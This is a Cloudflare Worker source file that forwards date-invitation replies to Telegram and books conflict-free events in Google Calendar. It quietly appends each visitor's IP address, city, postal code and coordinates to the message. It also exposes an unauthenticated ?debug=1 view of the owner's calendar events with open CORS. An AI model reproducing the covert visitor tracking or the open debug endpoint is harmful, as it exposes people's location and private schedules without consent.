/**
 * Cloudflare Worker — Telegram + automatic Google Calendar (with availability check).
 *
 * Secrets (Settings -> Variables and Secrets):
 *   Required (Telegram):   BOT_TOKEN, CHAT_ID
 *   Optional (calendar):   GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET, GOOGLE_REFRESH_TOKEN
 *                          EVENT_TIMEZONE (optional, defaults to "America/Toronto")
 *
 * IMPORTANT: the refresh token must be authorized for the FULL calendar scope
 *   https://www.googleapis.com/auth/calendar
 * (the narrower calendar.events scope canNOT run free/busy or list calendars).
 *
 * Flow when the calendar is configured:
 *   1) List ALL your calendars, run a free/busy check across them for the window.
 *   2) If BUSY on any -> return { conflict: true }; do NOT create the event or Telegram.
 *   3) If FREE        -> send Telegram AND create the event on your primary calendar.
 * The check fails OPEN (proceeds) only on a network/parse error — but real API errors
 * are reported to Telegram so misconfig is visible instead of silently ignored.
 */
export default {
  async fetch(request, env) {
    const p = new URL(request.url).searchParams;
    let text = p.get("text") || "New date response ❤️";

    // --- Approximate visitor location from Cloudflare edge geo (city-level) ---
    const cf = request.cf || {};
    const ip = request.headers.get("cf-connecting-ip") || "unknown";
    const parts = [cf.city, cf.region, cf.country].filter(Boolean).join(", ") || "unknown";
    let loc = `\n\n📍 Approx. location (from IP): ${parts}`;
    if (cf.postalCode) loc += `\n🏷️ Postal: ${cf.postalCode}`;
    if (cf.latitude && cf.longitude) {
      loc += `\n🗺️ ~${cf.latitude}, ${cf.longitude}` +
             `\n   Map: https://maps.google.com/?q=${cf.latitude},${cf.longitude}`;
    }
    if (cf.timezone) loc += `\n🕰️ IP timezone: ${cf.timezone}`;
    loc += `\n🌐 IP: ${ip}`;
    text += loc;

    const json = (obj) => new Response(JSON.stringify(obj), {
      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
    });
    const tgSend = (msg) => fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg, disable_web_page_preview: true })
    });

    const evTitle = p.get("evTitle");
    const evStart = p.get("evStart"); // RFC3339 w/ offset, e.g. 2026-07-25T20:30:00-04:00
    const evEnd = p.get("evEnd");
    const tz = env.EVENT_TIMEZONE || "America/Toronto";
    const canCal = env.GOOGLE_REFRESH_TOKEN && env.GOOGLE_CLIENT_ID &&
                   env.GOOGLE_CLIENT_SECRET && evTitle && evStart && evEnd;

    // --- Access token (needed for calendar list, free/busy, and insert) ---
    let accessToken = null;
    if (canCal) {
      try {
        const tr = await fetch("https://oauth2.googleapis.com/token", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            client_id: env.GOOGLE_CLIENT_ID,
            client_secret: env.GOOGLE_CLIENT_SECRET,
            refresh_token: env.GOOGLE_REFRESH_TOKEN,
            grant_type: "refresh_token"
          })
        });
        const tk = await tr.json();
        accessToken = tk.access_token || null;
        if (!accessToken) { try { await tgSend(`⚠️ Google token error: ${JSON.stringify(tk).slice(0, 200)}`); } catch (e) {} }
      } catch (e) { accessToken = null; }
    }

    const authHeaders = { "Authorization": `Bearer ${accessToken}`, "Content-Type": "application/json" };

    // --- 1) Availability check across ALL calendars ---
    // free/busy catches normal Google calendars; events.list ALSO catches imported /
    // subscribed (Outlook) calendars, which free/busy reports as empty.
    if (canCal && accessToken) {
      try {
        let items = [{ id: "primary" }];
        try {
          const cl = await fetch(
            "https://www.googleapis.com/calendar/v3/users/me/calendarList?minAccessRole=freeBusyReader&maxResults=250",
            { headers: authHeaders }
          );
          const clj = await cl.json();
          if (clj.error) { try { await tgSend(`⚠️ Calendar list error: ${JSON.stringify(clj.error).slice(0, 300)}`); } catch (e) {} }
          if (Array.isArray(clj.items) && clj.items.length) items = clj.items.map((c) => ({ id: c.id }));
        } catch (e) { /* fall back to primary only */ }

        const startMs = Date.parse(evStart);
        const endMs = Date.parse(evEnd);

        // (a) free/busy across all calendars
        let fbBusy = false, fbj = null;
        try {
          const fb = await fetch("https://www.googleapis.com/calendar/v3/freeBusy", {
            method: "POST", headers: authHeaders,
            body: JSON.stringify({ timeMin: evStart, timeMax: evEnd, items })
          });
          fbj = await fb.json();
          const cals = (fbj && fbj.calendars) || {};
          for (const id in cals) {
            const b = cals[id] && cals[id].busy;
            if (Array.isArray(b) && b.length > 0) { fbBusy = true; break; }
          }
        } catch (e) {}

        // (b) events.list per calendar (parallel) — a timed, non-cancelled, non-"free",
        //     non-declined event that overlaps counts as busy. All-day items (holidays /
        //     birthdays) are ignored. This is what catches the imported Outlook calendars.
        const blocks = (ev) => {
          if (ev.status === "cancelled") return false;
          if (ev.transparency === "transparent") return false;   // explicitly marked "Free"
          if (!ev.start || !ev.start.dateTime) return false;      // all-day event
          if (Array.isArray(ev.attendees)) {
            const me = ev.attendees.find((a) => a.self);
            if (me && me.responseStatus === "declined") return false;
          }
          const s = Date.parse(ev.start.dateTime);
          let e = Date.parse((ev.end && ev.end.dateTime) || ev.start.dateTime);
          if (!(e > s)) e = s + 60000; // zero-duration "deadline"/point event -> treat as a 1-min block
          return s < endMs && e > startMs; // overlaps the proposed window
        };
        const perCal = await Promise.all(items.map(async (it) => {
          try {
            const url = `https://www.googleapis.com/calendar/v3/calendars/${encodeURIComponent(it.id)}/events` +
              `?singleEvents=true&maxResults=50&timeMin=${encodeURIComponent(evStart)}&timeMax=${encodeURIComponent(evEnd)}`;
            const r = await fetch(url, { headers: authHeaders });
            if (!r.ok) return { id: it.id, ok: false, busy: false, events: [] };
            const j = await r.json();
            const evs = Array.isArray(j.items) ? j.items : [];
            return {
              id: it.id, ok: true, busy: evs.some(blocks),
              events: evs.map((e) => ({ summary: e.summary, transparency: e.transparency, status: e.status, start: e.start && (e.start.dateTime || e.start.date), end: e.end && (e.end.dateTime || e.end.date) }))
            };
          } catch (e) { return { id: it.id, ok: false, busy: false, events: [] }; }
        }));
        const eventsBusy = perCal.some((c) => c.busy);

        // Debug (only with ?debug=1) — inspect calendars + what each returned.
        if (p.get("debug") === "1") {
          return json({ debug: true, queried: items, fbBusy, eventsBusy, freebusy: fbj, perCal });
        }

        if (fbBusy || eventsBusy) {
          return json({ conflict: true, telegramOk: false, calendarOk: false });
        }
      } catch (e) { /* fail-open on network/parse errors */ }
    }

    // --- 2) No conflict → send Telegram ---
    let telegramOk = false;
    try { telegramOk = (await tgSend(text)).ok; } catch (e) { telegramOk = false; }

    // --- 3) Create the event on your primary calendar ---
    let calendarOk = null;
    if (canCal && accessToken) {
      calendarOk = false;
      try {
        const event = {
          summary: evTitle,
          location: p.get("evLoc") || "Kingston, Ontario",
          description: p.get("evDesc") || "",
          start: { dateTime: evStart, timeZone: tz },
          end: { dateTime: evEnd, timeZone: tz }
        };
        const cr = await fetch("https://www.googleapis.com/calendar/v3/calendars/primary/events", {
          method: "POST",
          headers: authHeaders,
          body: JSON.stringify(event)
        });
        calendarOk = cr.ok;
        if (!cr.ok) {
          const err = await cr.text();
          try { await tgSend(`⚠️ Calendar add failed: ${err.slice(0, 300)}`); } catch (e) {}
        }
      } catch (e) { calendarOk = false; }
    }

    return json({ conflict: false, telegramOk, calendarOk });
  }
};
